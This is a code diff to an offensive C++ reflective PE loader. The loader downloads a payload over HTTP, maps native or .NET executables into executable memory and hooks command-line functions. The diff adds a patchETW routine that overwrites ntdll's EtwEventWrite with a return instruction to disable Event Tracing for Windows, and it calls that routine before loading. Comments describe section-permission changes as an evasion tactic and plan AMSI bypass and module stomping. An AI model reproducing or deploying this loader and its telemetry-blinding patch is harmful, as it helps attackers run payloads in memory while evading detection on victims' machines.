@@ -16,13 +16,13 @@
     	rename("ReportEvent", "InteropServices_ReportEvent")	\
 		rename("or", "InteropServices_or") // rename for c# symbols to not overwrite C++ functions/symbols
 
-// TODO: native ExitThread function exits out of current process, hook this and fix
 // TODO: AMSI bypass before loading managed
-// TODO: ETW bypass 
+// TODO: Module Stomping 
+// TODO: native ExitThread function exits out of current process, hook this and fix
 // TODO: parse headers and allocate straight from HTTP download 
 // TODO: find argv/argc get functions for other native C++ compilers, 
 //		 tested: cl.exe (non-multithreaded) __p__argv
-//		 untested: __getmainargs, __getcmdln, Environment.GetCommandLineArgs
+//		 untested: __getmainargs, __getcmdln, Environment.GetCommandLineArgs, changing PRTL_USER_PROCESS_PARAMETERS of PEB
 
 // download file from url, returns buffer to file
 char* httpStage(LPCSTR urlStr,size_t &out_size) {
@@ -207,7 +207,7 @@ void wideToNarrowStr(LPWSTR lpwszStr, LPSTR* ppszStr) {
 // --- WARNING THIS IS GARBAGE CODE (c string manipulation + wide to narrow string conversion is a nightmare) ---
 // visual studio cl.exe compile uses __p___argc and __p___argv to retrieve commandline
 char*** __p___argvHook() {
-	// using GetCommandLineW because win32 has not implemented a CommandLineToArgvA function
+	// using GetCommandLineW because win32 has not implemented a CommandLineToArgvA function 
 	LPWSTR cmdLine = GetCommandLineW();  // not affected by the IAT hook because function address points to seperate IAT table
 	int argc; // Allocate memory for an int variable
 	LPWSTR* lpCmdLine = CommandLineToArgvW(cmdLine, &argc);
@@ -460,7 +460,7 @@ DWORD loadNative(char* peBuffer, int argc, char** argv) {
 	// NtUnmapViewOfSection does not have a corresponding user-mode function
 	//((NTSTATUS(WINAPI*)(HANDLE, PVOID))GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);
 
-	// try to alloc memory for image at preferred address
+	// try to alloc memory for image at preferred address (should this be changed to RW initially?)
 	LPVOID peImageBase = VirtualAlloc(preferredAddr, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
 	// if allocation not possible at preferred address, allocate anywhere
@@ -489,7 +489,7 @@ DWORD loadNative(char* peBuffer, int argc, char** argv) {
 			sectionHeader[i].SizeOfRawData
 		);
 
-		// smart rebase, change sections permissions(PAGE_EXECUTE_READWRITE) to specific permission (evasion tactic)
+		// change sections permissions(PAGE_EXECUTE_READWRITE) to specific permission (evasion tactic)
 		DWORD ulPermissions = PAGE_EXECUTE_READWRITE;
 		ULONG_PTR sectionVirtualSize = sectionHeader->Misc.VirtualSize;
 		if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
@@ -774,11 +774,39 @@ HRESULT loadManaged(void *code, size_t len, int argc, char** argv) {
 	return S_OK;
 }
 
+// patches ETW userland function, EtwEventWrite, with ret 14
+DWORD patchETW(bool arch32 = true) {
+	DWORD oldProt = NULL;
+	void* patchBytes = NULL;
+
+	// set correct bytes for architecture
+	if (arch32) { 
+		// ASM: ret 14
+		patchBytes = (void*)"\xc2\x14\x00\x00"; 
+	} else { 
+		return 1; 
+	}
+
+	// Get the EventWrite function
+	void* eventWrite = GetProcAddress(LoadLibraryA("ntdll"), "EtwEventWrite");
+	// Allow writing to page
+	VirtualProtect(eventWrite, 4, PAGE_EXECUTE_READWRITE, &oldProt);
+	// Patch function
+	memcpy(eventWrite, patchBytes, 4);
+	// Return memory to original protection
+	VirtualProtect(eventWrite, 4, oldProt, &oldProt);
+
+	return 0;
+}
+
 DWORD reflectiveLoadPE(char* peBuffer, int len, int argc, char** argv) {
 	IMAGE_NT_HEADERS* ntHeader = getNT(peBuffer);
 	if (ntHeader == NULL) {
 		return 1;
 	}
+
+	// patch Event Tracing for Windows
+	patchETW();
 
 	// check if PE is .NET
 	if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].Size > 0) {
